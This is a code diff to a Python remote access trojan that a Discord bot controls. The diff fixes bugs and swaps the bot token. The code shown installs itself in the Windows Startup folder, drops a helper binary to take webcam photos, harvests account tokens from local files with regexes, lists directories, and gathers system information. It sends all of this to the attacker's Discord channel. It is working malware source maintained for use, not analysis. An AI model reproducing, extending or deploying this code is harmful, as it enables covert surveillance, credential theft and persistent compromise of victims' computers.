@@ -4,8 +4,8 @@ from requests import get
 from socket import create_connection
 
 # All the needed variables
-notification_channel = 11011100111010101101100011011
-bot_token = "nullcode.yadayada.isthebest"
+notification_channel = 10101010101010
+bot_token = "nullcode.is.god.jekfmskefmwlke"
 bot_prefix = "rat> "
 
 client = commands.Bot(command_prefix=bot_prefix)
@@ -16,7 +16,7 @@ ogdir = os.getcwd(); a = 1
 def IP():
     try: addr = get("http://icanhazip.com/").text
     except: addr = "127.0.0.1"
-    return addr
+    return addr.rstrip()
 
 def is_connected():
     try: create_connection(("1.1.1.1", 53)); return True
@@ -84,7 +84,7 @@ async def geolocate(ctx):
 @client.command()
 async def startup(ctx):
     from sys import executable; msg = "```\n"
-    await ctx.send(embed = discord.Embed(title = "Last known RAT directory: \n" + ogdir + "Current Directory: \n" + os.getcwd(), color = 0x0081FA))
+    await ctx.send(embed = discord.Embed(title = "Last known RAT directory: \n" + ogdir + "\n\nCurrent Directory: \n" + os.getcwd(), color = 0x0081FA))
     os.chdir(ogdir)
     await ctx.send(embed = discord.Embed(title = "Trying to copy payload into startup directory...", color = 0x0081FA))
     subprocess.run(f'copy "{executable}" "{os.getenv("appdata")}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -100,7 +100,7 @@ async def webcam(ctx):
     os.chdir(f"C:\\Users\\{os.getenv('username')}\\Saved Games")
     with open("cc.exe", "wb") as fh: fh.write(decodebytes(webcam))
     subprocess.run("cc.exe & ren image.bmp image.png", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-    await ctx.send(embed=discord.Embed(title="Here is the photo", color=0x0081FA), file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
+    await ctx.send(embed=discord.Embed(title="Here is the photo", color=0x0081FA), file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png"))
     os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\image.png")
     os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\cc.exe"); os.chdir(ogdir)
 
@@ -126,7 +126,7 @@ async def token(ctx):
                         for token in re.findall(regex, line): 
                             tokens.append(token); tokens2.append(platform)
         except FileNotFoundError: continue
-    for tks, tks2 in zip(tokens, tokens2): message += f"__**{tks2}**__: `{tks}`\n"
+    for tks, tks2 in zip(tokens, tokens2): message += f"**{tks2}**:  `{tks}`\n"
     await ctx.send(message.rstrip())
     
 # Download and upload
@@ -167,13 +167,14 @@ async def dir(ctx, dire="null"):
     else:
         dire = dire[:-1]; dire = dire[1:] # dir makes use of `` [code indicators]: Example - "`C:\Users\NullCode`"
         os.chdir(dire)
-        subprocess.run('dir > "%temp%\\dir.txt"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        subprocess.run('dir > "C:\\Users\\{}\\Saved Games\\dir.txt"'.format(os.getenv("username")), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 
     file = discord.File(
-        os.path.join(os.getenv("TEMP") + "\\dir.txt"), filename="Directory.txt"
+        os.path.join(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt"), filename="Directory.txt"
     )
     await ctx.send("Contents of dir " + dire + " are:", file=file)
-    os.remove(os.path.join(os.getenv("TEMP") + "\\dir.txt"))
+    os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\dir.txt")
+    os.chdir(ogdir)
 
 # General System Information
 @client.command()
@@ -186,7 +187,8 @@ async def gsl(ctx):
         stdin=subprocess.PIPE,
     )
     await ctx.send(
-        "Here is the file", file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt"), filename="General Output.txt"),
+        "Here is the file", 
+        file=discord.File(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt", filename="General Output.txt"), 
     )
     os.remove(f"C:\\Users\\{os.getenv('username')}\\Saved Games\\youtube.txt")
 
